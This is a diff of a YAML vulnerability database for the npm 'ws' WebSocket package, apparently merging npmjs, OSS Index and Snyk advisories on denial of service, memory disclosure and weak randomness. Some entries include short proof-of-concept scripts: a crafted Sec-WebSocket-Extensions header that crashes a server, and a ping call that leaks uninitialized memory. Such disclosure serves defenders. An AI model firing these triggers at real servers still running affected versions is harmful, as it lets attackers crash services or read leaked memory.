@@ -1,5 +1,95 @@
 ---
-- id: ossindex:npm:ws:2016-06-29
+- id: npmjs:npm:ws:120
+  title: DoS due to excessively large websocket message
+  description: 'Affected versions of `ws` do not appropriately limit the size of incoming
+    websocket payloads, which may result in a denial of service condition when the
+    node process crashes after receiving a large payload.
+
+'
+  affected_package: ws
+  vulnerable_versions:
+  - "<=1.1.0"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2016-10542
+  cwe: CWE-730
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Fedor Indutny
+  references: https://npmjs.com/advisories/120
+  source_url: https://npmjs.com/advisories/120
+- id: npmjs:npm:ws:550
+  title: Denial of Service
+  description: |-
+    Affected versions of `ws` can crash when a specially crafted `Sec-WebSocket-Extensions` header containing `Object.prototype` property names as extension or parameter names is sent.
+
+    ## Proof of concept
+
+    ```
+    const WebSocket = require('ws');
+    const net = require('net');
+
+    const wss = new WebSocket.Server({ port: 3000 }, function () {
+      const payload = 'constructor';  // or ',;constructor'
+
+      const request = [
+        'GET / HTTP/1.1',
+        'Connection: Upgrade',
+        'Sec-WebSocket-Key: test',
+        'Sec-WebSocket-Version: 8',
+        `Sec-WebSocket-Extensions: ${payload}`,
+        'Upgrade: websocket',
+        '\r\n'
+      ].join('\r\n');
+
+      const socket = net.connect(3000, function () {
+        socket.resume();
+        socket.write(request);
+      });
+    });
+    ```
+  affected_package: ws
+  vulnerable_versions:
+  - "<1.1.5"
+  - ">=2.0.0 <3.3.1"
+  severity: high
+  package_manager: npm
+  cwe: CWE-20
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Nick Starke, Ryan Knell
+  references: https://npmjs.com/advisories/550
+  source_url: https://npmjs.com/advisories/550
+- id: npmjs:npm:ws:67
+  title: Remote Memory Disclosure
+  description: "Versions of `ws` prior to 1.0.1 are affected by a remote memory disclosure
+    vulnerability.\n\nIn certain rare circumstances, applications which allow users
+    to control the arguments of a `client.ping()` call will cause `ws` to send the
+    contents of an allocated but non-zero-filled buffer to the server. This may disclose
+    sensitive information that still exists in memory after previous use of the memory
+    for other tasks.\n\n\n\n## Proof of Concept\n```\nvar ws = require('ws')\n\nvar
+    server = new ws.Server({ port: 9000 })\nvar client = new ws('ws://localhost:9000')\n\nclient.on('open',
+    function () {\n  console.log('open')\n  client.ping(50) // this sends a non-zeroed
+    buffer of 50 bytes\n\n  client.on('pong', function (data) {\n    console.log('got
+    pong')\n    console.log(data) // Data from the client. \n  })\n})\n```"
+  affected_package: ws
+  vulnerable_versions:
+  - "<= 1.0.0"
+  severity: low
+  package_manager: npm
+  cve:
+  - CVE-2016-10518
+  cwe: CWE-201
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Feross Aboukhadijeh / Mathias Buss
+  references: https://npmjs.com/advisories/67
+  source_url: https://npmjs.com/advisories/67
+- id: ossindex:npm:ws:8399920115
   title: Denial of Service (DoS)
   description: The node process can be crashed by sending very large payloads to the
     `ws` server.
@@ -21,7 +111,7 @@
   - https://github.com/websockets/ws/pull/681
   - https://nodesecurity.io/advisories/120
   source_url: https://ossindex.net/resource/package/7014627894/vulnerabilities
-- id: ossindex:npm:ws:2017-07-30
+- id: ossindex:npm:ws:8405001082
   title: Insufficiently Random Values
   description: An insufficient implementation of random is used, leading to cryptographic
     insecurity.
@@ -38,6 +128,121 @@
   - https://github.com/websockets/ws/commit/7253f06f5432c76f3e82e2c055fcea08b612d8b2
   - https://github.com/websockets/ws/pull/832
   source_url: https://ossindex.net/resource/package/7014627894/vulnerabilities
+- id: snykio:npm:ws:20160104
+  title: Remote Memory Exposure
+  description: "[`ws`][1] is a simple to use websocket client, server and console
+    for\nnode.js. Affected versions of the package are vulnerable to\nUninitialized
+    Memory Exposure.\n\nA client side memory disclosure vulnerability exists in ping\nfunctionality
+    of the ws service. When a client sends a ping request and\nprovides an integer
+    value as ping data, it will result in leaking an\nuninitialized memory buffer.\n\nThis
+    is a result of unobstructed use of the `Buffer` constructor, whose\n[insecure
+    default constructor increases the odds of memory leakage][2].\n\n`ws`\\'s `ping`
+    function uses the default `Buffer` constructor as-is,\nmaking it easy to append
+    uninitialized memory to an existing list. If\nthe value of the buffer list is
+    exposed to users, it may expose raw\nmemory, potentially holding secrets, private
+    data and code.\n\n**Proof of Concept:**\n\n    var ws = require('ws')\n    \n
+    \   var server = new ws.Server({ port: 9000 })\n    var client = new ws('ws://localhost:9000')\n
+    \   \n    client.on('open', function () {\n      console.log('open')\n      client.ping(50)
+    // this makes the client allocate an uninitialized buffer of 50 bytes and send
+    it to the server\n    \n      client.on('pong', function (data) {\n        console.log('got
+    pong')\n        console.log(data)\n      })\n    })\n\n\n\n[1]: https://www.npmjs.com/package/ws\n[2]:
+    https://snyk.io/blog/exploiting-buffer/\n\\nThe Buffer class on Node.js is a mutable
+    array of binary data, and can\nbe initialized with a string, array or number.\n\n
+    \   const buf1 = new Buffer([1,2,3]);\n    // creates a buffer containing [01,
+    02, 03]\n    const buf2 = new Buffer('test');\n    // creates a buffer containing
+    ASCII bytes [74, 65, 73, 74]\n    const buf3 = new Buffer(10);\n    // creates
+    a buffer of length 10\n\nThe first two variants simply create a binary representation
+    of the\nvalue it received. The last one, however, pre-allocates a buffer of the\nspecified
+    size, making it a useful buffer, especially when reading data\nfrom a stream.
+    When using the number constructor of Buffer, it will\nallocate the memory, but
+    will not fill it with zeros. Instead, the\nallocated buffer will hold whatever
+    was in memory at the time. If the\nbuffer is not `zeroed` by using `buf.fill(0)`,
+    it may leak sensitive\ninformation like keys, source code, and system info.\n\nSimilar
+    vulnerabilities were discovered in [request][1], [mongoose][2],\n[ws][3] and [sequelize][4].\n\n\n\n[1]:
+    https://snyk.io/vuln/npm:request:20160119\n[2]: https://snyk.io/vuln/npm:mongoose:20160116\n[3]:
+    https://snyk.io/vuln/npm:ws:20160104\n[4]: https://snyk.io/vuln/npm:sequelize:20160115\n"
+  affected_package: ws
+  vulnerable_versions:
+  - "< 1.0.1"
+  severity: medium
+  package_manager: npm
+  cve:
+  - CVE-2016-10518
+  cwe:
+  - CWE-201
+  disclosed_date: 2016-01-04
+  created_date: 2016-01-05
+  last_modified_date: 2016-01-05
+  credit:
+  - Feross Aboukhadijeh
+  - Mathias Buss Madsen
+  references:
+  - https://github.com/nodejs/node-v0.x-archive/issues/4525
+  - https://github.com/websockets/ws/releases/tag/1.0.1
+  source_url: https://snyk.io/vuln/npm:ws:20160104
+- id: snykio:npm:ws:20160624
+  title: Denial of Service (DoS)
+  description: |+
+    [`ws`][1] is a WebSocket client and server implementation.
+
+    Affected versions of this package did not limit the size of an incoming
+    payload before it was processed by default. As a result, a very large
+    payload (over 256MB in size) could lead to a failed allocation and crash
+    the node process - enabling a [Denial of Service][2] attack.
+
+    While 256MB may seem excessive, note that the attack is likely to be
+    sent from another server, not an end-user computer, using data-center
+    connection speeds. In those speeds, a payload of this size can be
+    transmitted in seconds.
+
+
+
+    [1]: https://www.npmjs.com/package/ws
+    [2]: https://en.wikipedia.org/wiki/Denial-of-service_attack
+    \nDenial of Service (DoS) describes a family of attacks, all aimed at
+    making a system inaccessible to its intended and legitimate users.
+
+    Unlike other vulnerabilities, DoS attacks usually do not aim at
+    breaching security. Rather, they are focused on making websites and
+    services unavailable to genuine users resulting in downtime.
+
+    One popular Denial of Service vulnerability is DDoS (a Distributed
+    Denial of Service), an attack that attempts to clog network pipes to the
+    system by generating a large volume of traffic from many machines.
+
+    When it comes to open source libraries, DoS vulnerabilities allow
+    attackers to trigger such a crash or crippling of the service by using a
+    flaw either in the application code or from the use of open source
+    libraries.
+
+    Two common types of DoS vulnerabilities:
+
+    * High CPU/Memory Consumption- An attacker sending crafted requests that
+      could cause the system to take a disproportionate amount of time to
+      process. For example,
+      [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).
+
+    * Crash - An attacker sending crafted requests that could cause the
+      system to crash. For Example, [npm `ws` package](npm:ws:20171108)
+
+  affected_package: ws
+  vulnerable_versions:
+  - "<=1.1.0"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2016-10542
+  cwe:
+  - CWE-410
+  disclosed_date: 2016-06-24
+  created_date: 2016-06-26
+  last_modified_date: 2016-06-26
+  credit:
+  - Fedor Indutny
+  references:
+  - https://github.com/nodejs/node/issues/7388
+  - https://github.com/websockets/ws/commit/0328a8f49f004f98d2913016214e93b2fc2713bc
+  source_url: https://snyk.io/vuln/npm:ws:20160624
 - id: snykio:npm:ws:20160920
   title: Insecure Randomness
   description: |
@@ -139,118 +344,3 @@
   - https://github.com/websockets/ws/commit/f8fdcd40ac8be7318a6ee41f5ceb7e77c995b407
   - https://github.com/websockets/ws/releases/tag/3.3.1
   source_url: https://snyk.io/vuln/npm:ws:20171108
-- id: snykio:npm:ws:CVE-2016-10518
-  title: Remote Memory Exposure
-  description: "[`ws`][1] is a simple to use websocket client, server and console
-    for\nnode.js. Affected versions of the package are vulnerable to\nUninitialized
-    Memory Exposure.\n\nA client side memory disclosure vulnerability exists in ping\nfunctionality
-    of the ws service. When a client sends a ping request and\nprovides an integer
-    value as ping data, it will result in leaking an\nuninitialized memory buffer.\n\nThis
-    is a result of unobstructed use of the `Buffer` constructor, whose\n[insecure
-    default constructor increases the odds of memory leakage][2].\n\n`ws`\\'s `ping`
-    function uses the default `Buffer` constructor as-is,\nmaking it easy to append
-    uninitialized memory to an existing list. If\nthe value of the buffer list is
-    exposed to users, it may expose raw\nmemory, potentially holding secrets, private
-    data and code.\n\n**Proof of Concept:**\n\n    var ws = require('ws')\n    \n
-    \   var server = new ws.Server({ port: 9000 })\n    var client = new ws('ws://localhost:9000')\n
-    \   \n    client.on('open', function () {\n      console.log('open')\n      client.ping(50)
-    // this makes the client allocate an uninitialized buffer of 50 bytes and send
-    it to the server\n    \n      client.on('pong', function (data) {\n        console.log('got
-    pong')\n        console.log(data)\n      })\n    })\n\n\n\n[1]: https://www.npmjs.com/package/ws\n[2]:
-    https://snyk.io/blog/exploiting-buffer/\n\\nThe Buffer class on Node.js is a mutable
-    array of binary data, and can\nbe initialized with a string, array or number.\n\n
-    \   const buf1 = new Buffer([1,2,3]);\n    // creates a buffer containing [01,
-    02, 03]\n    const buf2 = new Buffer('test');\n    // creates a buffer containing
-    ASCII bytes [74, 65, 73, 74]\n    const buf3 = new Buffer(10);\n    // creates
-    a buffer of length 10\n\nThe first two variants simply create a binary representation
-    of the\nvalue it received. The last one, however, pre-allocates a buffer of the\nspecified
-    size, making it a useful buffer, especially when reading data\nfrom a stream.
-    When using the number constructor of Buffer, it will\nallocate the memory, but
-    will not fill it with zeros. Instead, the\nallocated buffer will hold whatever
-    was in memory at the time. If the\nbuffer is not `zeroed` by using `buf.fill(0)`,
-    it may leak sensitive\ninformation like keys, source code, and system info.\n\nSimilar
-    vulnerabilities were discovered in [request][1], [mongoose][2],\n[ws][3] and [sequelize][4].\n\n\n\n[1]:
-    https://snyk.io/vuln/npm:request:20160119\n[2]: https://snyk.io/vuln/npm:mongoose:20160116\n[3]:
-    https://snyk.io/vuln/npm:ws:20160104\n[4]: https://snyk.io/vuln/npm:sequelize:20160115\n"
-  affected_package: ws
-  vulnerable_versions:
-  - "< 1.0.1"
-  severity: medium
-  package_manager: npm
-  cve:
-  - CVE-2016-10518
-  cwe:
-  - CWE-201
-  disclosed_date: 2016-01-04
-  created_date: 2016-01-05
-  last_modified_date: 2016-01-05
-  credit:
-  - Feross Aboukhadijeh
-  - Mathias Buss Madsen
-  references:
-  - https://github.com/nodejs/node-v0.x-archive/issues/4525
-  - https://github.com/websockets/ws/releases/tag/1.0.1
-  source_url: https://snyk.io/vuln/npm:ws:20160104
-- id: snykio:npm:ws:CVE-2016-10542
-  title: Denial of Service (DoS)
-  description: |+
-    [`ws`][1] is a WebSocket client and server implementation.
-
-    Affected versions of this package did not limit the size of an incoming
-    payload before it was processed by default. As a result, a very large
-    payload (over 256MB in size) could lead to a failed allocation and crash
-    the node process - enabling a [Denial of Service][2] attack.
-
-    While 256MB may seem excessive, note that the attack is likely to be
-    sent from another server, not an end-user computer, using data-center
-    connection speeds. In those speeds, a payload of this size can be
-    transmitted in seconds.
-
-
-
-    [1]: https://www.npmjs.com/package/ws
-    [2]: https://en.wikipedia.org/wiki/Denial-of-service_attack
-    \nDenial of Service (DoS) describes a family of attacks, all aimed at
-    making a system inaccessible to its intended and legitimate users.
-
-    Unlike other vulnerabilities, DoS attacks usually do not aim at
-    breaching security. Rather, they are focused on making websites and
-    services unavailable to genuine users resulting in downtime.
-
-    One popular Denial of Service vulnerability is DDoS (a Distributed
-    Denial of Service), an attack that attempts to clog network pipes to the
-    system by generating a large volume of traffic from many machines.
-
-    When it comes to open source libraries, DoS vulnerabilities allow
-    attackers to trigger such a crash or crippling of the service by using a
-    flaw either in the application code or from the use of open source
-    libraries.
-
-    Two common types of DoS vulnerabilities:
-
-    * High CPU/Memory Consumption- An attacker sending crafted requests that
-      could cause the system to take a disproportionate amount of time to
-      process. For example,
-      [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).
-
-    * Crash - An attacker sending crafted requests that could cause the
-      system to crash. For Example, [npm `ws` package](npm:ws:20171108)
-
-  affected_package: ws
-  vulnerable_versions:
-  - "<=1.1.0"
-  severity: high
-  package_manager: npm
-  cve:
-  - CVE-2016-10542
-  cwe:
-  - CWE-410
-  disclosed_date: 2016-06-24
-  created_date: 2016-06-26
-  last_modified_date: 2016-06-26
-  credit:
-  - Fedor Indutny
-  references:
-  - https://github.com/nodejs/node/issues/7388
-  - https://github.com/websockets/ws/commit/0328a8f49f004f98d2913016214e93b2fc2713bc
-  source_url: https://snyk.io/vuln/npm:ws:20160624
